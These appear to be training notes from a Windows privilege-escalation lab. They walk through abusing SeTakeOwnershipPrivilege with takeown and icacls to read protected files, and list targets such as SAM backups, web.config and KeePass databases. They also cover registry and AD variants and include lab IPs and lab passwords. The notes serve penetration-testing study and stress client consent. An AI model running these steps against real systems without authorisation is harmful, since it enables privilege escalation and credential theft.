# Section 9 — SeTakeOwnershipPrivilege

> **Lab: yes** — take ownership of a protected file and read its contents.

**Core principle:** `SeTakeOwnershipPrivilege` grants `WRITE_OWNER` rights over ANY securable object — files, folders, registry keys, services, AD objects. Once you own an object, you can modify its DACL to grant yourself full access. This is a three-step attack: enable privilege → take ownership → modify ACL → access.

---

## When you'll encounter this

- Backup/restore service accounts with granular privilege assignment (instead of full admin)
- Misconfigured Group Policy granting this to non-admin users
- Post-exploitation via GPO abuse (SharpGPOAbuse) — assign this privilege to a controlled account
- **Our lab:** htb-student has this privilege assigned (found in Section 4)

---

## Attack flow

```
1. Confirm SeTakeOwnershipPrivilege in whoami /priv
2. Enable the privilege (it's likely in Disabled state)
3. Take ownership of target object: takeown /f <path>
4. Grant yourself Full Control: icacls <path> /grant <user>:F
5. Access the object (read file, modify registry key, etc.)
```

---

## Step-by-step exploitation

### Step 1: Confirm privilege

```cmd
whoami /priv
```
> Look for `SeTakeOwnershipPrivilege` — even if `Disabled`, it's in your token and can be enabled.

### Step 2: Enable all token privileges

```powershell
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv
```
> Both scripts are in `C:\Tools` on the lab target. After running, privilege state changes from `Disabled` to `Enabled`.

### Step 3: Take ownership

```powershell
takeown /f 'C:\Path\To\Target\file.txt'
```
> For directories (recursive):
```powershell
takeown /f 'C:\Path\To\Directory' /r /d y
```

### Step 4: Grant yourself full control

```powershell
icacls 'C:\Path\To\Target\file.txt' /grant htb-student:F
```
> `F` = Full Control. For directories:
```powershell
icacls 'C:\Path\To\Directory' /grant htb-student:F /t
```

### Step 5: Read the file

```powershell
cat 'C:\Path\To\Target\file.txt'
```

---

## High-value targets for this privilege

| Target | Path | Why |
|--------|------|-----|
| Web config | `c:\inetpub\wwwroot\web.config` | Database connection strings, API keys |
| SAM backup | `%WINDIR%\repair\sam` | Local account hashes (older systems) |
| SYSTEM backup | `%WINDIR%\repair\system` | Boot key for SAM decryption |
| Security hive | `%WINDIR%\system32\config\security.sav` | LSA secrets |
| Department shares | `C:\Department Shares\Private\*` | Passwords, SSH keys, configs |
| KeePass databases | `*.kdbx` anywhere | Master password → all stored creds |
| OneNote notebooks | `*.one` | People store passwords in notes |
| Scripts | `*.ps1`, `*.bat`, `*.vbs` | Hardcoded credentials |
| Virtual disks | `*.vmdk`, `*.vhdx` | Mount offline → extract SAM/NTDS |

---

## Registry key variant

Same technique works on registry keys (for modifying service configs, reading stored credentials):

```powershell
# Take ownership of a registry key
takeown /f "HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>" /r /d y

# Grant full access (use regedit or PowerShell)
# Then modify ImagePath to point to your payload
```

---

## AD object variant (domain environment)

If you can assign this privilege via GPO abuse:
```powershell
# Take ownership of an AD object (e.g., AdminSDHolder, GPO, user object)
# Then modify the DACL to add GenericAll for your controlled account
# → Reset password, add to group, DCSync, etc.
```

---

## Lab walkthrough

**Target:** `10.129.43.43` (ACADEMY-WINLPE-SRV01)
**Creds:** `htb-student` / `HTB_@cademy_stdnt!`
**Goal:** Read `C:\TakeOwn\flag.txt`

### Commands to run (PowerShell):

```powershell
# Confirm privilege
whoami /priv

# Enable it
cd C:\Tools
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1

# Verify enabled
whoami /priv

# Take ownership
takeown /f 'C:\TakeOwn\flag.txt'

# Grant full access
icacls 'C:\TakeOwn\flag.txt' /grant htb-student:F

# Read flag
cat 'C:\TakeOwn\flag.txt'
```

---

## Lab observations & attack chain (WINLPE-SRV01)

```
Section 4: htb-student has SeTakeOwnershipPrivilege (non-default!)
Section 6: Theory — this privilege bypasses all DACLs via WRITE_OWNER
Section 9 (now): Full exploitation
    │
    ▼
├── htb-student + SeTakeOwnershipPrivilege
│   ├── Enable privilege (EnableAllTokenPrivs.ps1)
│   ├── Take ownership of ANY file on the system
│   │   ├── C:\TakeOwn\flag.txt (lab exercise)
│   │   ├── Could target: web.config, SAM hive, department shares
│   │   └── Could target: C:\Department Shares\Private\IT\cred.txt
│   │       └── Contains: root:n1X_p0wer_us3er! (NIX01 admin creds)
│   └── Modify DACL → Full access → read/write/execute
│
├── Connecting to earlier findings:
│   ├── sccm_svc owns "C:\Department Shares\Private\IT" (from module text)
│   │   └── We can bypass that ownership with our privilege
│   ├── Section 8: We already have sccm_svc's NTLM hash
│   │   └── This section provides an alternative path (no dump needed)
│   └── htb-student's credman had amanda:Passw0rd! on WEB01
│       └── Combined with NIX01 root creds → multi-host compromise
│
└── Real engagement use:
    ├── Take ownership of backup scripts → find hardcoded creds
    ├── Take ownership of service configs → modify for code execution
    └── Take ownership of VHDX files → offline hash extraction
```

**Important operational note:** Taking ownership is a DESTRUCTIVE action — it changes the security descriptor permanently. On a real engagement:
- Document everything you change
- Only do it with client consent
- Try to revert ownership after (may not always be possible for nested directories)
- Prefer less destructive methods if available (e.g., if you have the NTLM hash from Section 8, use that instead)

---

## Key takeaways

- **Three steps: takeown → icacls → access.** Simple but powerful. Memorize this flow.
- **Disabled ≠ unavailable.** The privilege is in your token — enable it with the scripts in C:\Tools.
- **This is an alternative to SeBackupPrivilege.** Both let you read protected files, but different mechanism (ownership change vs. backup bypass).
- **Works on registry keys too.** Take ownership of a service's registry key → change ImagePath → restart service → SYSTEM.
- **Destructive action.** On exams, do it. On real engagements, get consent first and document everything.
- **Check department shares and IT folders.** Credential files in share structures are extremely common in corporate environments.
